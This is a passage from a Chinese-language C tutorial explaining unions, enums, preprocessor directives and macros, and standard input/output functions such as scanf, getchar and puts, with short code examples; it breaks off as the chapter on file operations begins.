结构有时需要一种数据结构，不同的场合表示不同的数据类型。比如，如果只用一种数据结构表示水果的“量”，这种结构就需要有时是整数（6个苹果），有时是浮点数（1.5公斤草莓）。 C 语言提供了 Union 结构，用来自定义可以灵活变更的数据结构。它内部可以包含各种属性，但同一时间只能有一个属性，因为所有属性都保存在同一个内存地址，后面写入的属性会覆盖前面的属性。这样做的最大好处是节省空间。 12345union quantity { short count; float weight; float volume;}; 上面示例中，union命令定义了一个包含三个属性的数据类型quantity。虽然包含三个属性，但是同一时间只能取到一个属性。最后赋值的属性，就是可以取到值的那个属性。 使用时，声明一个该类型的变量。 123456789// 写法一union quantity q;q.count = 4;// 写法二union quantity q = {.count=4};// 写法三union quantity q = {4}; 上面代码展示了为 Union 结构赋值的三种写法。最后一种写法不指定属性名，就会赋值给第一个属性。 执行完上面的代码以后，q.count可以取到值，另外两个属性取不到值。 12printf(&quot;count is %i\\n&quot;, q.count); // count is 4printf(&quot;weight is %f\\n&quot;, q.weight); // 未定义行为 如果要让q.weight属性可以取到值，就要先为它赋值。 12q.weight = 0.5;printf(&quot;weight is %f\\n&quot;, q.weight); // weight is 0.5 一旦为其他属性赋值，原先可以取到值的q.count属性就不再有效了。除了这一点，Union 结构的其他用法与 Struct 结构，基本上是一致的。 Union 结构也支持指针运算符-&gt;。 12345678910111213union quantity { short count; float weight; float volume;};union quantity q;q.count = 4;union quantity* ptr;ptr = &amp;q;printf(&quot;%d\\n&quot;, ptr-&gt;count); // 4 上面示例中，ptr是q的指针，那么ptr-&gt;count等同于q.count。 Union 结构指针与它的属性有关，当前哪个属性能够取到值，它的指针就是对应的数据类型。 123456789101112131415union foo { int a; float b;} x;int* foo_int_p = (int *)&amp;x;float* foo_float_p = (float *)&amp;x;x.a = 12;printf(&quot;%d\\n&quot;, x.a); // 12printf(&quot;%d\\n&quot;, *foo_int_p); // 12x.b = 3.141592;printf(&quot;%f\\n&quot;, x.b); // 3.141592printf(&quot;%f\\n&quot;, *foo_float_p); // 3.141592 上面示例中，&amp;x是 foo 结构的指针，它的数据类型完全由当前赋值的属性决定。 typedef 命令可以为 Union 数据类型起别名。 12345typedef union { short count; float weight; float volume;} quantity; 上面示例中，union命令定义了一个包含三个属性的数据类型，typedef命令为它起别名为quantity。 Union 结构的好处，主要是节省空间。它将一段内存空间，重用于不同类型的数据。定义了三个属性，但同一时间只用到一个，使用 Union 结构就可以节省另外两个属性的空间。Union 结构占用的内存长度，等于它内部最长属性的长度。 Enum 类型如果一种数据类型的取值只有少数几种可能，并且每种取值都有自己的含义，为了提高代码的可读性，可以将它们定义为 Enum 类型，中文名为枚举。 12345enum colors {RED, GREEN, BLUE};printf(&quot;%d\\n&quot;, RED); // 0printf(&quot;%d\\n&quot;, GREEN); // 1printf(&quot;%d\\n&quot;, BLUE); // 2 上面示例中，假定程序里面需要三种颜色，就可以使用enum命令，把这三种颜色定义成一种枚举类型colors，它只有三种取值可能RED、GREEN、BLUE。这时，这三个名字自动成为整数常量，编译器默认将它们的值设为数字0、1、2。相比之下，RED要比0的可读性好了许多。 注意，Enum 内部的常量名，遵守标识符的命名规范，但是通常都使用大写。 使用时，可以将变量声明为 Enum 类型。 1enum colors color; 上面代码将变量color声明为enum colors类型。这个变量的值就是常量RED、GREEN、BLUE之中的一个。 12color = BLUE;printf(&quot;%i\\n&quot;, color); // 2 上面代码将变量color的值设为BLUE，这里BLUE就是一个常量，值等于2。 typedef 命令可以为 Enum 类型起别名。 123456789typedef enum { SHEEP, WHEAT, WOOD, BRICK, ORE} RESOURCE;RESOURCE r; 上面示例中，RESOURCE是 Enum 类型的别名。声明变量时，使用这个别名即可。 还有一种不常见的写法，就是声明 Enum 类型时，在同一行里面为变量赋值。 1234567enum { SHEEP, WHEAT, WOOD, BRICK, ORE} r = BRICK, s = WOOD; 上面示例中，r的值是3，s的值是2。 由于 Enum 的属性会自动声明为常量，所以有时候使用 Enum 的目的，不是为了自定义一种数据类型，而是为了声明一组常量。这时就可以使用下面这种写法，比较简单。 123enum { ONE, TWO };printf(&quot;%d %d&quot;, ONE, TWO); // 0 1 上面示例中，enum是一个关键字，后面跟着一个代码块，常量就在代码内声明。ONE和TWO就是两个 Enum 常量。 常量之间使用逗号分隔。最后一个常量后面的尾逗号，可以省略，也可以保留。 1enum { ONE, TWO, }; 由于Enum 会自动编号，因此可以不必为常量赋值。C 语言会自动从0开始递增，为常量赋值。但是，C 语言也允许为 ENUM 常量指定值，不过只能指定为整数，不能是其他类型。因此，任何可以使用整数的场合，都可以使用 Enum 常量。 123enum { ONE = 1, TWO = 2 };printf(&quot;%d %d&quot;, ONE, TWO); // 1 2 Enum 常量可以是不连续的值。 1enum { X = 2, Y = 18, Z = -2 }; Enum 常量也可以是同一个值。 1enum { X = 2, Y = 2, Z = 2 }; 如果一组常量之中，有些指定了值，有些没有指定。那么，没有指定值的常量会从上一个指定了值的常量，开始自动递增赋值。 12345678910enum { A, // 0 B, // 1 C = 4, // 4 D, // 5 E, // 6 F = 3 // 3 G, // 4 H // 5} Enum 的作用域与变量相同。如果是在顶层声明，那么在整个文件内都有效；如果是在代码块内部声明，则只对该代码块有效。如果与使用int声明的常量相比，Enum 的好处是更清晰地表示代码意图。 预处理器（Preprocessor）简介C 语言编译器在编译程序之前，会先使用预处理器（preprocessor）处理代码。 预处理器首先会清理代码，进行删除注释、多行的语句合成一个逻辑行等等。然后，执行#开头的预处理指令。本章介绍 C 语言的预处理指令。 预处理指令可以出现在程序的任何地方，但是习惯上，往往放在代码的开头部分。 每个预处理指令都以#开头，放在一行的行首，指令前面可以有空白字符（比如空格或制表符）。#和指令的其余部分之间也可以有空格，但是为了兼容老的编译器，一般不留空格。 所有预处理指令都是一行的，除非在行尾使用反斜杠，将其折行。指令结尾处不需要分号。 #define#define是最常见的预处理指令，用来将指定的词替换成另一个词。它的参数分成两个部分，第一个参数就是要被替换的部分，其余参数是替换后的内容。每条替换规则，称为一个宏（macro）。 1#define MAX 100 上面示例中，#define指定将源码里面的MAX，全部替换成100。MAX就称为一个宏。 宏的名称不允许有空格，而且必须遵守 C 语言的变量命名规则，只能使用字母、数字与下划线（_），且首字符不能是数字。 宏是原样替换，指定什么内容，就一模一样替换成什么内容。 1234#define HELLO &quot;Hello, world&quot;// 相当于 printf(&quot;%s&quot;, &quot;Hello, world&quot;);printf(&quot;%s&quot;, HELLO); 上面示例中，宏HELLO会被原样替换成&quot;Hello, world&quot;。 #define指令可以出现在源码文件的任何地方，从指令出现的地方到该文件末尾都有效。习惯上，会将#define放在源码文件的头部。它的主要好处是，会使得程序的可读性更好，也更容易修改。 #define指令从#开始，一直到换行符为止。如果整条指令过长，可以在折行处使用反斜杠，延续到下一行。 12#define OW &quot;C programming language is invented \\in 1970s.&quot; 上面示例中，第一行结尾的反斜杠将#define指令拆成两行。 #define允许多重替换，即一个宏可以包含另一个宏。 12#define TWO 2#define FOUR TWO*TWO 上面示例中，FOUR会被替换成2*2。 注意，如果宏出现在字符串里面（即出现在双引号中），或者是其他标识符的一部分，就会失效，并不会发生替换。 12345678#define TWO 2// 输出 TWOprintf(&quot;TWO\\n&quot;);// 输出 22const TWOs = 22;printf(&quot;%d\\n&quot;, TWOs); 上面示例中，双引号里面的TWO，以及标识符TWOs，都不会被替换。 同名的宏可以重复定义，只要定义是相同的，就没有问题。如果定义不同，就会报错。 1234567// 正确#define FOO hello#define FOO hello// 报错#define BAR hello#define BAR world 上面示例中，宏FOO没有变化，所以可以重复定义，宏BAR发生了变化，就报错了。 带参数的宏基本用法宏的强大之处在于，它的名称后面可以使用括号，指定接受一个或多个参数。 1#define SQUARE(X) X*X 上面示例中，宏SQUARE可以接受一个参数X，替换成X*X。 注意，宏的名称与左边圆括号之间，不能有空格。 这个宏的用法如下。 12// 替换成 z = 2*2;z = SQUARE(2); 这种写法很像函数，但又不是函数，而是完全原样的替换，会跟函数有不一样的行为。 1234#define SQUARE(X) X*X// 输出19printf(&quot;%d\\n&quot;, SQUARE(3 + 4)); 上面示例中，SQUARE(3 + 4)如果是函数，输出的应该是49（7*7）；宏是原样替换，所以替换成3 + 4*3 + 4，最后输出19。 可以看到，原样替换可能导致意料之外的行为。解决办法就是在定义宏的时候，尽量多使用圆括号，这样可以避免很多意外。 1#define SQUARE(X) ((X) * (X)) 上面示例中，SQUARE(X)替换后的形式，有两层圆括号，就可以避免很多错误的发生。 宏的参数也可以是空的。 1#define getchar() getc(stdin) 上面示例中，宏getchar()的参数就是空的。这种情况其实可以省略圆括号，但是加上了，会让它看上去更像函数。 一般来说，带参数的宏都是一行的。下面是两个例子。 12#define MAX(x, y) ((x)&gt;(y)?(x):(y))#define IS_EVEN(n) ((n)%2==0) 如果宏的长度过长，可以使用反斜杠（\\）折行，将宏写成多行。 123456#define PRINT_NUMS_TO_PRODUCT(a, b) { \\ int product = (a) * (b); \\ for (int i = 0; i &lt; product; i++) { \\ printf(&quot;%d\\n&quot;, i); \\ } \\} 上面示例中，替换文本放在大括号里面，这是为了创造一个块作用域，避免宏内部的变量污染外部。 带参数的宏也可以嵌套，一个宏里面包含另一个宏。 123#define QUADP(a, b, c) ((-(b) + sqrt((b) * (b) - 4 * (a) * (c))) / (2 * (a)))#define QUADM(a, b, c) ((-(b) - sqrt((b) * (b) - 4 * (a) * (c))) / (2 * (a)))#define QUAD(a, b, c) QUADP(a, b, c), QUADM(a, b, c) 上面示例是一元二次方程组求解的宏，由于存在正负两个解，所以宏QUAD先替换成另外两个宏QUADP和QUADM，后者再各自替换成一个解。 那么，什么时候使用带参数的宏，什么时候使用函数呢？ 一般来说，应该首先使用函数，它的功能更强、更容易理解。宏有时候会产生意想不到的替换结果，而且往往只能写成一行，除非对换行符进行转义，但是可读性就变得很差。 宏的优点是相对简单，本质上是字符串替换，不涉及数据类型，不像函数必须定义数据类型。而且，宏将每一处都替换成实际的代码，省掉了函数调用的开销，所以性能会好一些。另外，以前的代码大量使用宏，尤其是简单的数学运算，为了读懂前人的代码，需要对它有所了解。 #运算符，##运算符由于宏不涉及数据类型，所以替换以后可能为各种类型的值。如果希望替换后的值为字符串，可以在替换文本的参数前面加上#。 1234#define STR(x) #x// 等同于 printf(&quot;%s\\n&quot;, &quot;3.14159&quot;);printf(&quot;%s\\n&quot;, STR(3.14159)); 上面示例中，STR(3.14159)会被替换成3.14159。如果x前面没有#，这会被解释成一个浮点数，有了#以后，就会被转换成字符串。 下面是另一个例子。 1234#define XNAME(n) &quot;x&quot;#n// 输出 x4printf(&quot;%s\\n&quot;, XNAME(4)); 上面示例中，#n指定参数输出为字符串，再跟前面的字符串结合，最终输出为&quot;x4&quot;。如果不加#，这里实现起来就很麻烦了。 如果替换后的文本里面，参数需要跟其他标识符连在一起，组成一个新的标识符，可以使用##运算符。它起到粘合作用，将参数“嵌入”一个标识符之中。 1#define MK_ID(n) i##n 上面示例中，n是宏MK_ID的参数，这个参数需要跟标识符i粘合在一起，这时i和n之间就要使用##运算符。下面是这个宏的用法示例。 123int MK_ID(1), MK_ID(2), MK_ID(3);// 替换成int i1, i2, i3; 上面示例中，替换后的文本i1、i2、i3是三个标识符，参数n是标识符的一部分。从这个例子可以看到，##运算符的一个主要用途是批量生成变量名和标识符。 不定参数的宏宏的参数还可以是不定数量的（即不确定有多少个参数），...表示剩余的参数。 1#define X(a, b, ...) (10*(a) + 20*(b)), __VA_ARGS__ 上面示例中，X(a, b, ...)表示X()至少有两个参数，多余的参数使用...表示。在替换文本中，__VA_ARGS__代表多余的参数（每个参数之间使用逗号分隔）。下面是用法示例。 123X(5, 4, 3.14, &quot;Hi!&quot;, 12)// 替换成(10*(5) + 20*(4)), 3.14, &quot;Hi!&quot;, 12 注意，...只能替代宏的尾部参数，不能写成下面这样。 12// 报错#define WRONG(X, ..., Y) #X #__CA_ARGS__ #Y 上面示例中，...替代中间部分的参数，这是不允许的，会报错。 __VA_ARGS__前面加上一个#号，可以让输出变成一个字符串。 123#define X(...) #__VA_ARGS__printf(&quot;%s\\n&quot;, X(1,2,3)); // Prints &quot;1, 2, 3&quot; #undef#undef指令用来取消已经使用#define定义的宏。 12#define LIMIT 400#undef LIMIT 上面示例的undef指令取消已经定义的宏LIMIT，后面就可以重新用 LIMIT 定义一个宏。 有时候想重新定义一个宏，但不确定是否以前定义过，就可以先用#undef取消，然后再定义。因为同名的宏如果两次定义不一样，会报错，而#undef的参数如果是不存在的宏，并不会报错。 GCC 的-U选项可以在命令行取消宏的定义，相当于#undef。 1gcc -ULIMIT foo.c 上面示例中的-U参数，取消了宏LIMIT，相当于源文件里面的#undef LIMIT。 #include#include指令用于编译时将其他源码文件，加载进入当前文件。它有两种形式。 12345// 形式一#include &lt;foo.h&gt; // 加载系统提供的文件// 形式二#include &quot;foo.h&quot; // 加载用户提供的文件 形式一，文件名写在尖括号里面，表示该文件是系统提供的，通常是标准库的库文件，不需要写路径。因为编译器会到系统指定的安装目录里面，去寻找这些文件。 形式二，文件名写在双引号里面，表示该文件由用户提供，具体的路径取决于编译器的设置，可能是当前目录，也可能是项目的工作目录。如果所要包含的文件在其他位置，就需要指定路径，下面是一个例子。 1#include &quot;/usr/local/lib/foo.h&quot; GCC 编译器的-I参数，也可以用来指定include命令中用户文件的加载路径。 1gcc -Iinclude/ -o code code.c 上面命令中，-Iinclude/指定从当前目录的include子目录里面，加载用户自己的文件。 #include最常见的用途，就是用来加载包含函数原型的头文件（后缀名为.h），参见《多文件编译》一章。多个#include指令的顺序无关紧要，多次包含同一个头文件也是合法的。 #if…#endif#if...#endif指令用于预处理器的条件判断，满足条件时，内部的行会被编译，否则就被编译器忽略。 123#if 0 const double pi = 3.1415; // 不会执行#endif 上面示例中，#if后面的0，表示判断条件不成立。所以，内部的变量定义语句会被编译器忽略。#if 0这种写法常用来当作注释使用，不需要的代码就放在#if 0里面。 #if后面的判断条件，通常是一个表达式。如果表达式的值不等于0，就表示判断条件为真，编译内部的语句；如果表达式的值等于0，表示判断条件为伪，则忽略内部的语句。 #if...#endif之间还可以加入#else指令，用于指定判断条件不成立时，需要编译的语句。 1234567#define FOO 1#if FOO printf(&quot;defined\\n&quot;);#else printf(&quot;not defined\\n&quot;);#endif 上面示例中，宏FOO如果定义过，会被替换成1，从而输出defined，否则输出not defined。 如果有多个判断条件，还可以加入#elif命令。 1234567#if HAPPY_FACTOR == 0 printf(&quot;I'm not happy!\\n&quot;);#elif HAPPY_FACTOR == 1 printf(&quot;I'm just regular\\n&quot;);#else printf(&quot;I'm extra happy!\\n&quot;);#endif 上面示例中，通过#elif指定了第二重判断。注意，#elif的位置必须在#else之前。如果多个判断条件皆不满足，则执行#else的部分。 没有定义过的宏，等同于0。因此如果UNDEFINED是一个没有定义过的宏，那么#if UNDEFINED为伪，而#if !UNDEFINED为真。 #if的常见应用就是打开（或关闭）调试模式。 123456#define DEBUG 1#if DEBUGprintf(&quot;value of i : %d\\n&quot;, i);printf(&quot;value of j : %d\\n&quot;, j);#endif 上面示例中，通过将DEBUG设为1，就打开了调试模式，可以输出调试信息。 GCC 的-D参数可以在编译时指定宏的值，因此可以很方便地打开调试开关。 1gcc -DDEBUG=1 foo.c 上面示例中，-D参数指定宏DEBUG为1，相当于在代码中指定#define DEBUG 1。 #ifdef…#endif#ifdef...#endif指令用于判断某个宏是否定义过。 有时源码文件可能会重复加载某个库，为了避免这种情况，可以在库文件里使用#define定义一个空的宏。通过这个宏，判断库文件是否被加载了。 1#define EXTRA_HAPPY 上面示例中，EXTRA_HAPPY就是一个空的宏。 然后，源码文件使用#ifdef...#endif检查这个宏是否定义过。 123#ifdef EXTRA_HAPPY printf(&quot;I'm extra happy!\\n&quot;);#endif 上面示例中，#ifdef检查宏EXTRA_HAPPY是否定义过。如果已经存在，表示加载过库文件，就会打印一行提示。 #ifdef可以与#else指令配合使用。 12345#ifdef EXTRA_HAPPY printf(&quot;I'm extra happy!\\n&quot;);#else printf(&quot;I'm just regular\\n&quot;);#endif 上面示例中，如果宏EXTRA_HAPPY没有定义过，就会执行#else的部分。 #ifdef...#else...#endif可以用来实现条件加载。 1234567#ifdef MAVIS #include &quot;foo.h&quot; #define STABLES 1#else #include &quot;bar.h&quot; #define STABLES 2#endif 上面示例中，通过判断宏MAVIS是否定义过，实现加载不同的头文件。 defined 运算符上一节的#ifdef指令，等同于#if defined。 123#ifdef FOO// 等同于#if defined FOO 上面示例中，defined是一个预处理运算符，如果它的参数是一个定义过的宏，就会返回1，否则返回0。 使用这种语法，可以完成多重判断。 12345#if defined FOO x = 2;#elif defined BAR x = 3;#endif 这个运算符的一个应用，就是对于不同架构的系统，加载不同的头文件。 1234567#if defined IBMPC #include &quot;ibmpc.h&quot;#elif defined MAC #include &quot;mac.h&quot;#else #include &quot;general.h&quot;#endif 上面示例中，不同架构的系统需要定义对应的宏。代码根据不同的宏，加载对应的头文件。 #ifndef…#endif#ifndef...#endif指令跟#ifdef...#endif正好相反。它用来判断，如果某个宏没有被定义过，则执行指定的操作。 1234567#ifdef EXTRA_HAPPY printf(&quot;I'm extra happy!\\n&quot;);#endif#ifndef EXTRA_HAPPY printf(&quot;I'm just regular\\n&quot;);#endif 上面示例中，针对宏EXTRA_HAPPY是否被定义过，#ifdef和#ifndef分别指定了两种情况各自需要编译的代码。 #ifndef常用于防止重复加载。举例来说，为了防止头文件myheader.h被重复加载，可以把它放在#ifndef...#endif里面加载。 1234#ifndef MYHEADER_H #define MYHEADER_H #include &quot;myheader.h&quot;#endif 上面示例中，宏MYHEADER_H对应文件名myheader.h的大写。只要#ifndef发现这个宏没有被定义过，就说明该头文件没有加载过，从而加载内部的代码，并会定义宏MYHEADER_H，防止被再次加载。 #ifndef等同于#if !defined。 123#ifndef FOO// 等同于#if !defined FOO 预定义宏C 语言提供一些预定义的宏，可以直接使用。 __DATE__：编译日期，格式为“Mmm dd yyyy”的字符串（比如 Nov 23 2021）。 __TIME__：编译时间，格式为“hh:mm:ss”。 __FILE__：当前文件名。 __LINE__：当前行号。 __func__：当前正在执行的函数名。该预定义宏必须在函数作用域使用。 __STDC__：如果被设为1，表示当前编译器遵循 C 标准。 __STDC_HOSTED__：如果被设为1，表示当前编译器可以提供完整的标准库；否则被设为0（嵌入式系统的标准库常常是不完整的）。 __STDC_VERSION__：编译所使用的 C 语言版本，是一个格式为yyyymmL的长整数，C99 版本为“199901L”，C11 版本为“201112L”，C17 版本为“201710L”。 下面示例打印这些预定义宏的值。 12345678910111213141516171819#include &lt;stdio.h&gt;int main(void) { printf(&quot;This function: %s\\n&quot;, __func__); printf(&quot;This file: %s\\n&quot;, __FILE__); printf(&quot;This line: %d\\n&quot;, __LINE__); printf(&quot;Compiled on: %s %s\\n&quot;, __DATE__, __TIME__); printf(&quot;C Version: %ld\\n&quot;, __STDC_VERSION__);}/* 输出如下This function: mainThis file: test.cThis line: 7Compiled on: Mar 29 2021 19:19:37C Version: 201710*/ #line#line指令用于覆盖预定义宏__LINE__，将其改为自定义的行号。后面的行将从__LINE__的新值开始计数。 12// 将下一行的行号重置为 300#line 300 上面示例中，紧跟在#line 300后面一行的行号，将被改成300，其后的行会在300的基础上递增编号。 #line还可以改掉预定义宏__FILE__，将其改为自定义的文件名。 1#line 300 &quot;newfilename&quot; 上面示例中，下一行的行号重置为300，文件名重置为newfilename。 #error#error指令用于让预处理器抛出一个错误，终止编译。 123#if __STDC_VERSION__ != 201112L #error Not C11#endif 上面示例指定，如果编译器不使用 C11 标准，就中止编译。GCC 编译器会像下面这样报错。 12$ gcc -std=c99 newish.cnewish.c:14:2: error: #error Not C11 上面示例中，GCC 使用 C99 标准编译，就报错了。 123#if INT_MAX &lt; 100000 #error int type is too small#endif 上面示例中，编译器一旦发现INT类型的最大值小于100,000，就会停止编译。 #error指令也可以用在#if...#elif...#else的部分。 123456789#if defined WIN32 // ...#elif defined MAC_OS // ...#elif defined LINUX // ...#else #error NOT support the operating system#endif #pragma#pragma指令用来修改编译器属性。 12// 使用 C99 标准#pragma c9x on 上面示例让编译器以 C99 标准进行编译。 I/O 函数C 语言提供了一些函数，用于与外部设备通信，称为输入输出函数，简称 I/O 函数。输入（import）指的是获取外部数据，输出（export）指的是向外部传递数据。 缓存和字节流严格地说，输入输出函数并不是直接与外部设备通信，而是通过缓存（buffer）进行间接通信。这个小节介绍缓存是什么。 普通文件一般都保存在磁盘上面，跟 CPU 相比，磁盘读取或写入数据是一个很慢的操作。所以，程序直接读写磁盘是不可行的，可能每执行一行命令，都必须等半天。C 语言的解决方案，就是只要打开一个文件，就在内存里面为这个文件设置一个缓存区。 程序向文件写入数据时，程序先把数据放入缓存，等到缓存满了，再把里面的数据会一次性写入磁盘文件。这时，缓存区就空了，程序再把新的数据放入缓存，重复整个过程。 程序从文件读取数据时，文件先把一部分数据放到缓存里面，然后程序从缓存获取数据，等到缓存空了，磁盘文件再把新的数据放入缓存，重复整个过程。 内存的读写速度比磁盘快得多，缓存的设计减少了读写磁盘的次数，大大提高了程序的执行效率。另外，一次性移动大块数据，要比多次移动小块数据快得多。 这种读写模式，对于程序来说，就有点像水流（stream），不是一次性读取或写入所有数据，而是一个持续不断的过程。先操作一部分数据，等到缓存吞吐完这部分数据，再操作下一部分数据。这个过程就叫做字节流操作。 由于缓存读完就空了，所以字节流读取都是只能读一次，第二次就读不到了。这跟读取文件很不一样。 C 语言的输入输出函数，凡是涉及读写文件，都是属于字节流操作。输入函数从文件获取数据，操作的是输入流；输出函数向文件写入数据，操作的是输出流。 printf()printf()是最常用的输出函数，用于屏幕输出，原型定义在头文件stdio.h，详见《基本语法》一章。 scanf()基本用法scanf()函数用于读取用户的键盘输入。程序运行到这个语句时，会停下来，等待用户从键盘输入。用户输入数据、按下回车键后，scanf()就会处理用户的输入，将其存入变量。它的原型定义在头文件stdio.h。 scanf()的语法跟printf()类似。 1scanf(&quot;%d&quot;, &amp;i); 它的第一个参数是一个格式字符串，里面会放置占位符（与printf()的占位符基本一致），告诉编译器如何解读用户的输入，需要提取的数据是什么类型。这是因为 C 语言的数据都是有类型的，scanf()必须提前知道用户输入的数据类型，才能处理数据。它的其余参数就是存放用户输入的变量，格式字符串里面有多少个占位符，就有多少个变量。 上面示例中，scanf()的第一个参数%d，表示用户输入的应该是一个整数。%d就是一个占位符，%是占位符的标志，d表示整数。第二个参数&amp;i表示，将用户从键盘输入的整数存入变量i。 注意，变量前面必须加上&amp;运算符（指针变量除外），因为scanf()传递的不是值，而是地址，即将变量i的地址指向用户输入的值。如果这里的变量是指针变量（比如字符串变量），那就不用加&amp;运算符。 下面是一次将键盘输入读入多个变量的例子。 1scanf(&quot;%d%d%f%f&quot;, &amp;i, &amp;j, &amp;x, &amp;y); 上面示例中，格式字符串%d%d%f%f，表示用户输入的前两个是整数，后两个是浮点数，比如1 -20 3.4 -4.0e3。这四个值依次放入i、j、x、y四个变量。 scanf()处理数值占位符时，会自动过滤空白字符，包括空格、制表符、换行符等。所以，用户输入的数据之间，有一个或多个空格不影响scanf()解读数据。另外，用户使用回车键，将输入分成几行，也不影响解读。 12341-203.4-4.0e3 上面示例中，用户分成四行输入，得到的结果与一行输入是完全一样的。每次按下回车键以后，scanf()就会开始解读，如果第一行匹配第一个占位符，那么下次按下回车键时，就会从第二个占位符开始解读。 scanf()处理用户输入的原理是，用户的输入先放入缓存，等到按下回车键后，按照占位符对缓存进行解读。解读用户输入时，会从上一次解读遗留的第一个字符开始，直到读完缓存，或者遇到第一个不符合条件的字符为止。 123456int x;float y;// 用户输入 &quot; -13.45e12## 0&quot;scanf(&quot;%d&quot;, &amp;x);scanf(&quot;%f&quot;, &amp;y); 上面示例中，scanf()读取用户输入时，%d占位符会忽略起首的空格，从-处开始获取数据，读取到-13停下来，因为后面的.不属于整数的有效字符。这就是说，占位符%d会读到-13。 第二次调用scanf()时，就会从上一次停止解读的地方，继续往下读取。这一次读取的首字符是.，由于对应的占位符是%f，会读取到.45e12，这是采用科学计数法的浮点数格式。后面的#不属于浮点数的有效字符，所以会停在这里。 由于scanf()可以连续处理多个占位符，所以上面的例子也可以写成下面这样。 1scanf(&quot;%d%f&quot;, &amp;x, &amp;y); scanf()的返回值是一个整数，表示成功读取的变量个数。如果没有读取任何项，或者匹配失败，则返回0。如果读取到文件结尾，则返回常量 EOF。 占位符scanf()常用的占位符如下，与printf()的占位符基本一致。 %c：字符。 %d：整数。 %f：float类型浮点数。 %lf：double类型浮点数。 %Lf：long double类型浮点数。 %s：字符串。 %[]：在方括号中指定一组匹配的字符（比如%[0-9]），遇到不在集合之中的字符，匹配将会停止。 上面所有占位符之中，除了%c以外，都会自动忽略起首的空白字符。%c不忽略空白字符，总是返回当前第一个字符，无论该字符是否为空格。如果要强制跳过字符前的空白字符，可以写成scanf(&quot; %c&quot;, &amp;ch)，即%c前加上一个空格，表示跳过零个或多个空白字符。 下面要特别说一下占位符%s，它其实不能简单地等同于字符串。它的规则是，从当前第一个非空白字符开始读起，直到遇到空白字符（即空格、换行符、制表符等）为止。因为%s不会包含空白字符，所以无法用来读取多个单词，除非多个%s一起使用。这也意味着，scanf()不适合读取可能包含空格的字符串，比如书名或歌曲名。另外，scanf()遇到%s占位符，会在字符串变量末尾存储一个空字符\\0。 scanf()将字符串读入字符数组时，不会检测字符串是否超过了数组长度。所以，储存字符串时，很可能会超过数组的边界，导致预想不到的结果。为了防止这种情况，使用%s占位符时，应该指定读入字符串的最长长度，即写成%[m]s，其中的[m]是一个整数，表示读取字符串的最大长度，后面的字符将被丢弃。 12char name[11];scanf(&quot;%10s&quot;, name); 上面示例中，name是一个长度为11的字符数组，scanf()的占位符%10s表示最多读取用户输入的10个字符，后面的字符将被丢弃，这样就不会有数组溢出的风险了。 赋值忽略符有时，用户的输入可能不符合预定的格式。 1scanf(&quot;%d-%d-%d&quot;, &amp;year, &amp;month, &amp;day); 上面示例中，如果用户输入2020-01-01，就会正确解读出年、月、日。问题是用户可能输入其他格式，比如2020/01/01，这种情况下，scanf()解析数据就会失败。 为了避免这种情况，scanf()提供了一个赋值忽略符（assignment suppression character）*。只要把*加在任何占位符的百分号后面，该占位符就不会返回值，解析后将被丢弃。 1scanf(&quot;%d%*c%d%*c%d&quot;, &amp;year, &amp;month, &amp;day); 上面示例中，%*c就是在占位符的百分号后面，加入了赋值忽略符*，表示这个占位符没有对应的变量，解读后不必返回。 sscanf()sscanf()函数与scanf()很类似，不同之处是sscanf()从字符串里面，而不是从用户输入获取数据。它的原型定义在头文件stdio.h里面。 1int sscanf(const char* s, const char* format, ...); sscanf()的第一个参数是一个字符串指针，用来从其中获取数据。其他参数都与scanf()相同。 sscanf()主要用来处理其他输入函数读入的字符串，从其中提取数据。 12fgets(str, sizeof(str), stdin);sscanf(str, &quot;%d%d&quot;, &amp;i, &amp;j); 上面示例中，fgets()先从标准输入获取了一行数据（fgets()的介绍详见下一章），存入字符数组str。然后，sscanf()再从字符串str里面提取两个整数，放入变量i和j。 sscanf()的一个好处是，它的数据来源不是流数据，所以可以反复使用，不像scanf()的数据来源是流数据，只能读取一次。 sscanf()的返回值是成功赋值的变量的数量，如果提取失败，返回常量 EOF。 getchar()，putchar()（1）getchar() getchar()函数返回用户从键盘输入的一个字符，使用时不带有任何参数。程序运行到这个命令就会暂停，等待用户从键盘输入，等同于使用scanf()方法读取一个字符。它的原型定义在头文件stdio.h。 12345char ch;ch = getchar();// 等同于scanf(&quot;%c&quot;, &amp;ch); getchar()不会忽略起首的空白字符，总是返回当前读取的第一个字符，无论是否为空格。如果读取失败，返回常量 EOF，由于 EOF 通常是-1，所以返回值的类型要设为 int，而不是 char。 由于getchar()返回读取的字符，所以可以用在循环条件之中。 12while (getchar() != '\\n') ; 上面示例中，只有读到的字符等于换行符（\\n），才会退出循环，常用来跳过某行。while循环的循环体没有任何语句，表示对该行不执行任何操作。 下面的例子是计算某一行的字符长度。 123int len = 0;while(getchar() != '\\n') len++; 上面示例中，getchar()每读取一个字符，长度变量len就会加1，直到读取到换行符为止，这时len就是该行的字符长度。 下面的例子是跳过空格字符。 12while ((ch = getchar()) == ' ') ; 上面示例中，结束循环后，变量ch等于第一个非空格字符。 （2）putchar() putchar()函数将它的参数字符输出到屏幕，等同于使用printf()输出一个字符。它的原型定义在头文件stdio.h。 123putchar(ch);// 等同于printf(&quot;%c&quot;, ch); 操作成功时，putchar()返回输出的字符，否则返回常量 EOF。 （3）小结 由于getchar()和putchar()这两个函数的用法，要比scanf()和printf()更简单，而且通常是用宏来实现，所以要比scanf()和printf()更快。如果操作单个字符，建议优先使用这两个函数。 puts()puts()函数用于将参数字符串显示在屏幕（stdout）上，并且自动在字符串末尾添加换行符。它的原型定义在头文件stdio.h。 12puts(&quot;Here are some messages:&quot;);puts(&quot;Hello World&quot;); 上面示例中，puts()在屏幕上输出两行内容。 写入成功时，puts()返回一个非负整数，否则返回常量 EOF。 gets()gets()函数以前用于从stdin读取整行输入，现在已经被废除了，仍然放在这里介绍一下。 该函数读取用户的一行输入，不会跳过起始处的空白字符，直到遇到换行符为止。这个函数会丢弃换行符，将其余字符放入参数变量，并在这些字符的末尾添加一个空字符\\0，使其成为一个字符串。 它经常与puts()配合使用。 1234char words[81];puts(&quot;Enter a string, please&quot;);gets(words); 上面示例使用puts()在屏幕上输出提示，然后使用gets()获取用户的输入。 由于gets()获取的字符串，可能超过字符数组变量的最大长度，有安全风险，建议不要使用，改为使用fgets()。 文件操作本章介绍 C 语言如何操作文件。 文件指针C 语言提供了一个 FILE 数据结构，记录了操作一个文件所需要的信息。该结构定义在头文件stdio.h，所有文件操作函数都要通过这个数据结构，获取文件信息。 开始操作一个文件之前，就要定义一个指向该文件的 FILE 指针，相当于获取一块内存区域，用来保存文件信息。 1FILE* fp; 上面示例定义了一个 FILE 指针fp。 下面是一个读取文件的完整示例。 123456789101112131415161718#include 